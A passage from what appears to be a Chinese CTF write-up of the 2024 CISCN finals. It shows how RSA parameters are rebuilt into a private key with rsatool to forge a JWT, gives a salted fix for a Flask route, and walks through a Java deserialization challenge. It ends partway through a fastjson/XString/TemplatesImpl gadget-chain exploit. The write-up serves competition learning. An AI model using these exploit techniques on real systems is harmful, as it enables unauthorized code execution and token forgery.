'_dp'<span class="token operator">:</span> Integer(<span class="token number">999961340297895911973127986950882551487550934138074807877558935721989527165341592892216389386499601947060186549862682084373292897207589027275977241785025</span>)<span class="token punctuation">,</span>
'_dq'<span class="token operator">:</span> Integer(<span class="token number">5244118286473985022664696467883188378455894052098520751546836553485478835899655790885322032358858770327861839227039124427954186139921478037534838971662989</span>)<span class="token punctuation">,</span>
'_invq'<span class="token operator">:</span> None<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>接下来我们要做的是生成一个rsa私钥，使用工具：<a target="_blank" rel="noopener" href="https://github.com/ius/rsatool">https://github.com/ius/rsatool</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 rsatool.py <span class="token parameter variable">-f</span> PEM <span class="token parameter variable">-o</span> private.pem <span class="token parameter variable">-n</span> <span class="token number">126123614477015775448789877206017292386336663012480330606083697181136984617708780170725665068837288536687956308850816616924015665300736823691410985286499563938666378049277495278535134451022151639249605836868202071595881433292992822004089702149441937221323083043604617381139486807424885868287782232845765278943</span> <span class="token parameter variable">-d</span> <span class="token number">16356021780675909418180038243647725223789238124159945219053440687588434506704715239803430541832066088977385914352550321608209242708561000115252482779955744104485540020656221986885376506975459291207812710017083944289037938520247378083893059236195153243903078926446378766613488506330804090368443881290180527489</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到私钥，于是伪造jwt</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809184225259.png" alt="image-20240809184225259"></p>
<p>带回token，得到base64编码后flag</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809184249085.png" alt="image-20240809184249085"></p>
<hr>
<h3 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h3><p>本题由@Laffey修复</p>
<p>加盐</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/createCard"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">create_card</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"create.html"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/style.css'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    info<span class="token operator">=</span>Info<span class="token punctuation">(</span><span class="token operator">**</span><span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'avatar'</span><span class="token punctuation">:</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'avatar'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'signature'</span><span class="token punctuation">:</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'salt'</span><span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token comment">#</span>
    <span class="token keyword">if</span> <span class="token string">'&#123;'</span> <span class="token keyword">in</span> info<span class="token punctuation">.</span>name<span class="token operator">+</span>info<span class="token punctuation">.</span>avatar<span class="token operator">+</span>info<span class="token punctuation">.</span>signature <span class="token keyword">or</span> <span class="token string">'&#125;'</span> <span class="token keyword">in</span> info<span class="token punctuation">.</span>name<span class="token operator">+</span>info<span class="token punctuation">.</span>avatar<span class="token operator">+</span>info<span class="token punctuation">.</span>signature<span class="token punctuation">:</span>
        <span class="token keyword">raise</span> Exception
    <span class="token comment">#</span>
    <span class="token keyword">if</span> info<span class="token punctuation">.</span>avatar <span class="token keyword">not</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'avatars'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> FileNotFoundError
    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">,</span> rsakey<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"RS256"</span><span class="token punctuation">)</span>
    share_url <span class="token operator">=</span> request<span class="token punctuation">.</span>url_root <span class="token operator">+</span> url_for<span class="token punctuation">(</span><span class="token string">'show_card'</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>
    qr_img <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
    qrcode<span class="token punctuation">.</span>make<span class="token punctuation">(</span>share_url<span class="token punctuation">)</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>qr_img<span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">)</span>
    qr_img<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    share_img <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>qr_img<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"created.html"</span><span class="token punctuation">,</span> share_url<span class="token operator">=</span>share_url<span class="token punctuation">,</span> share_img<span class="token operator">=</span>share_img<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>貌似这个算非预期（？</p>
<p>看别的师傅是写ssti waf</p>
<hr>
<h2 id="SolonMaster（复现）"><a href="#SolonMaster（复现）" class="headerlink" title="SolonMaster（复现）"></a>SolonMaster（复现）</h2><p>就一个控制器DemoController</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">BufferedReader</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileReader</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectStreamClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>json<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Mapping</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Post</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>core<span class="token punctuation">.</span>handle<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>core<span class="token punctuation">.</span>handle<span class="token punctuation">.</span></span><span class="token class-name">ModelAndView</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Controller</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoController</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">ModelAndView</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ModelAndView</span> model <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModelAndView</span><span class="token punctuation">(</span><span class="token string">"freemarker.ftl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        model<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token string">"/api"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> model<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">/*
     * WARNING - Removed try catching itself - possible behaviour change.
     */</span>
    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/log"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> filePath <span class="token operator">=</span> <span class="token string">"./logs/solon.log"</span><span class="token punctuation">;</span>
        <span class="token class-name">BufferedReader</span> reader <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token class-name">StringBuilder</span> stringBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">String</span> line<span class="token punctuation">;</span>
            reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">lineSeparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>reader <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    reader<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> stringBuilder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/api"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@Post</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">api</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Context</span> ctx<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">JSONObject</span> jsonObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> jsonObject<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span><span class="token class-name">DemoController</span><span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token string">"success"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> data<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">boolean</span> check <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

            <span class="token keyword">protected</span> <span class="token class-name">Class</span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> targetc <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> targetc<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一眼丁真漏洞点在反序列化上，还提供了<code>resolveClass</code>过滤，看了下依赖里面有个fastjson，不知道是不是打那个，反正我刚好没学这个（</p>
<br>

<p>resolveClass 这里禁用了 BadAttributeValueExpException 并且必须为 User 的子类，也就是最外层得是 User，看下 User</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>
   <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
   <span class="token keyword">public</span> <span class="token class-name">Map</span> info<span class="token punctuation">;</span>

   <span class="token keyword">public</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token punctuation">&#125;</span>

   <span class="token keyword">public</span> <span class="token class-name">Map</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getInfo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>info<span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>

   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setInfo</span><span class="token punctuation">(</span><span class="token class-name">Map</span> info<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>info <span class="token operator">=</span> info<span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>

   <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>

   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>

   <span class="token keyword">public</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>User 里面有个 Map，我们把这个Map设置成恶意的序列化数据就行了</p>
<p>fastjson 1.2.80 考虑原生反序列化，ban了 BadAttributeValueExpException 就用 XString 链，此事在 西湖论剑2023 ez_api 中亦有记载</p>
<p>高版本需要引用绕过自带的 resolveClass</p>
<p>那就直接起exp：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSONArray</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Utils</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xpath<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>objects<span class="token punctuation">.</span></span><span class="token class-name">XString</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>aop<span class="token punctuation">.</span>target<span class="token punctuation">.</span></span><span class="token class-name">HotSwappableTargetSource</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Array</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EXP</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">TemplatesImpl</span> tpl <span class="token operator">=</span> <span class="token class-name">Utils</span><span class="token punctuation">.</span><span class="token function">getTemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">JSONArray</span> jsonArray <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        jsonArray<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>tpl<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">HotSwappableTargetSource</span> h1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HotSwappableTargetSource</span><span class="token punctuation">(</span>jsonArray<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HotSwappableTargetSource</span> h2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HotSwappableTargetSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">XString</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

